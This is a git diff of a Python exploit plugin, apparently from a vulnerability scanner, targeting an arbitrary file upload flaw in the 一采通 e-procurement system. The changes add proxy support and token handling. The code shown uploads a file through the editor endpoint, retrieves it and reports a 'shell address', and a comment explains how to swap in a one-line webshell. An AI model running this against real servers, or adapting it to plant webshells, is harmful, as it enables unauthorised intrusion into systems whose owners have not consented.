@@ -30,8 +30,8 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,UnixTimestamp):
-
+def medusa(Url,RandomAgent,Token,proxies=None):
+    proxies=ClassCongregation.Proxies().result(proxies)
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
@@ -86,19 +86,19 @@ Content-Disposition: form-data; name="img_vspace"
         }
 
         s = requests.session()
-        resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
+        resp = s.post(payload_url,data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
         con = resp.text
         match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
         if match:
             payload_url2 = scheme + "://" + url + ":" + str(port) + "/library/editornew/Editor/NewImage/"+match.group(1)
-            resp2 = s.get(payload_url2, headers=headers, timeout=6, verify=False)
+            resp2 = s.get(payload_url2, headers=headers, timeout=6,proxies=proxies, verify=False)
             con2 = resp2.text
             code2 = resp2.status_code
             #如果要上传shell直接把testvul这个值改为一句话就可以
             if code2 == 200 and con2.lower().find(RD) != -1:
                 Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url2,con2)
                 _t=VulnerabilityInfo(Medusa)
-                ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
+                ClassCongregation.VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
                 ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
